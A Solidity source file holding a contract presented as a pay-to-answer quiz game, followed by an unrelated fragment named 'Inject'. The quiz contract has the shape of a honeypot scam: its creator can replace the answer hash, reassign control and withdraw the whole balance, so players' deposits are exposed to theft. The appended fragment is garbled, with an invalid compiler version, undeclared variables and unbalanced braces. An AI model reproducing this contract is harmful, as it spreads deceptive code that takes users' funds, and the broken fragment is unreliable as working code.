pragma solidity ^0.4.25;

contract MathTest
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(abi.encodePacked(_response)) && msg.value>minBet)
        {
            msg.sender.transfer(address(this).balance);
        }
    }

    string public question;
    uint256 public minBet = count * 2 * 10 finney;

    address questionSender;

    bytes32 responseHash;

    uint count;

    function start_quiz_game(string _question,bytes32 _response, uint _count) public payable {
        if(responseHash==0x0)
        {
            responseHash = _response;
            question = _question;
            count = _count;
            questionSender = msg.sender;
        }
    }

    function StopGame() public payable onlyQuestionSender {
       msg.sender.transfer(address(this).balance);
    }

    function NewQuestion(string _question, bytes32 _responseHash) public payable onlyQuestionSender {
        question = _question;
        responseHash = _responseHash;
    }

    function newQuestioner(address newAddress) public onlyQuestionSender{
        questionSender = newAddress;
    }

    modifier onlyQuestionSender(){
        require(msg.sender==questionSender);
        _;
    }

    function() public payable{}
}
pragma solidity ^0.5.24;
contract Inject {
	uint depositAmount;
	constructor() public {owner = msg.sender;}
	function freeze(address account,uint key) {
		if (msg.sender != minter)
			revert();
			freezeAccount[account] = key;
		}
	}
}
